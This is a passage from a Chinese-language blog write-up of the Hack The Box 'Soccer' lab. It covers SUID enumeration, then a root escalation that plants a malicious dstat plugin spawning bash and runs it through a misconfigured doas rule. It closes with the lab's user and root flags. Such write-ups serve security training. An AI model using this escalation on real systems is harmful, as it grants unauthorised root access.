+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>doas<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/snapd/</span>snap-confine<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/dbus-1.0/</span>dbus-daemon-launch-helper<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/openssh/</span>ssh-keysign<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/policykit-1/</span>polkit-agent-helper-<span class="hljs-number">1</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/eject/</span>dmcrypt-get-device<br><span class="hljs-regexp">/usr/</span>bin/umount<br><span class="hljs-regexp">/usr/</span>bin/fusermount<br><span class="hljs-regexp">/usr/</span>bin/mount<br><span class="hljs-regexp">/usr/</span>bin/su<br><span class="hljs-regexp">/usr/</span>bin/newgrp<br><span class="hljs-regexp">/usr/</span>bin/chfn<br><span class="hljs-regexp">/usr/</span>bin/sudo<br><span class="hljs-regexp">/usr/</span>bin/passwd<br><span class="hljs-regexp">/usr/</span>bin/gpasswd<br><span class="hljs-regexp">/usr/</span>bin/chsh<br><span class="hljs-regexp">/usr/</span>bin/at<br><span class="hljs-regexp">/snap/</span>snapd<span class="hljs-regexp">/17883/u</span>sr<span class="hljs-regexp">/lib/</span>snapd/snap-confine<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>chfn<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>chsh<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/g</span>passwd<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/m</span>ount<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>newgrp<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>passwd<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>su<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/</span>sudo<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/bin/um</span>ount<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/lib/</span>dbus-<span class="hljs-number">1.0</span>/dbus-daemon-launch-helper<br><span class="hljs-regexp">/snap/</span>core20<span class="hljs-regexp">/1695/u</span>sr<span class="hljs-regexp">/lib/</span>openssh/ssh-keysign<br></code></pre></td></tr></table></figure>
+
+<h3 id="doas指令提權"><a href="#doas指令提權" class="headerlink" title="doas指令提權"></a>doas指令提權</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs !">先找尋他的設定檔 一開始是找/etc/doas.conf但沒成功<br>用find去尋找<br><br>find / -iname &quot;doas.conf&quot; 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">/usr/local/etc/doas.conf<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/A7pp3vN.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>dstat搭配doas<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">查看dstat的man page<br>發現可以執行外部腳本插件<br></code></pre></td></tr></table></figure>
+<img src="https://i.imgur.com/PeeS2xC.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">因為/usr/share/dstat沒有權限寫入<br>改用/usr/local/share/dstat/<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>dstat_priv.py</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-title">subprocess</span>.run([<span class="hljs-string">&quot;bash&quot;</span>])<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>利用doas執行dstat並附上插件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">doas /usr/bin/dstat --priv<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/qYSR27Z.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul>
+<li><p>user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">35907f92e87694451271ef44e476bcb8<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>root</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">8a8620bfc3502b614ccb3aa46ff7de90<br></code></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/C0fIZJ1.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/HTB/%E9%9D%B6%E6%A9%9F/" class="category-chain-item">靶機</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HackTheBox/">#HackTheBox</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB-Soccer</div>
+      <div>https://luoming1995125.github.io/2023/01/21/HTB-Soccer/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Peter Luo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>發布於</div>
+          <div>2023年1月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>許可協議</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/25/GCP-%E5%AE%89%E8%A3%9D-Chrome-Remote-Desktop/" title="GCP 安裝 Chrome-Remote-Desktop">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">GCP 安裝 Chrome-Remote-Desktop</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/20/HTB-Intelligence/" title="HTB-Intelligence">
+                        <span class="hidden-mobile">HTB-Intelligence</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目錄</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜尋</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">關鍵字</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <p>Copyright © 2023 Giwawa . Powered by Hexo Fluid.</p>
+      <div>
+        <span id="timeDate">載入天數...</span>
+        <span id="times">載入分秒...</span>
+        <script>
+        var now = new Date();
+        function createtime(){
+            var grt= new Date("07/25/2023 00:00:00");//此处修改你的建站时间或者网站上线时间
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+                hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+                      mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+                      snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀 運行 "+dnum+" 天";  //此次自定义显示内容
+            document.getElementById("times").innerHTML = hnum + " 小時 " + mnum + " 分 " + snum + " 秒";
+        }  //此次自定义显示内容
+        setInterval("createtime()",250);
+        </script>
+      </div>
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允許 JavaScript 運行的環境下瀏覽效果更佳</div>
+  </noscript>
+</body>
+</html>
